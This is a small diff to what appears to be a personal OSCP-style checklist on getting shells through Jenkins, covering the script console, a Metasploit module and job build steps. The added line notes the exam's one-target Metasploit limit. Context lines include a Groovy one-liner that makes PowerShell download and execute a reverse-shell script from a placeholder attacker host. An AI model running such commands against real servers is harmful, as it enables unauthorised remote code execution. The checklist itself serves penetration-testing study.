@@ -29,6 +29,7 @@ Windows, a script from Kali loaded into memory:
 ['powershell','-nop','-c','iex (iwr -UseBasicParsing http://<LHOST>/rev.ps1)'].execute()
 - [ ] Other shells: :Pb shells
 - [ ] With credentials, Metasploit does it too: exploit/multi/http/jenkins_script_console
+- [ ] OSCP one-target limit: that Metasploit module spends my one target, even if it fails
 
 ## No console, but a job
 - [ ] I can create or configure a job: a build step, Execute shell or Execute Windows batch command, with the shell line, then Build Now
